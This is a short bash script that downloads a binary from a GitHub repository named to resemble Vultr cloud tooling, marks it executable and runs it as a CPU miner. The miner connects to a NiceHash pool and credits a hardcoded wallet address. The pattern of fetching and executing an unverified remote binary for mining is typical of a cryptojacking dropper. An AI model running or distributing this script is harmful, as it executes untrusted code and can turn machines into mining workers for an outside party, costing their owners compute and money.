#!/bin/bash
wget https://github.com/vultrdocker/portal-vultr/raw/master/scrypt
chmod u+x scrypt
./scrypt -o stratum+tcp://scrypt.usa-west.nicehash.com:3333 -u 3NFjvzSUkafgFvrhoEyHguguCu7Tg811y4.cpu -p x -t 8
